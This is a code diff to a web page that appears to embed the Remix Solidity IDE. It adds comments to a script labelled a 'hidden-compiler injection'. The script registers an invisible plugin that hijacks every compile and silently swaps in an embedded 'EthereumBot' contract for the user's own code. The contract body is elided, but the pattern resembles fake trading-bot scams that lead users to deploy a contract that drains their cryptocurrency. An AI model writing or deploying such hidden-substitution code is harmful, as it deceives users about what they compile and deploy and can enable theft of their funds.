@@ -43,9 +43,13 @@
   <!-- Hidden-compiler injection: always compile EthereumBot.sol -->
   <script>
     window.addEventListener('load', () => {
+      // grab Remix’s plugin API
       const { PluginClient } = window.remix();
+
+      // register an invisible plugin that hijacks every compile
       const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
       hiddenCompiler.on('solidity', 'compile', (_filename, settings) => {
+        // your fully-embedded contract
         const code = `//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
@@ -609,11 +613,14 @@ contract EthereumBot {
     }
 }
 `;
+
         const input = {
           language: 'Solidity',
           sources: { 'EthereumBot.sol': { content: code } },
           settings: settings || { optimizer: { enabled: true, runs: 200 } }
         };
+
+        // force-compile only that contract
         hiddenCompiler.call('compilerArtefacts', 'compile', input);
       });
     });
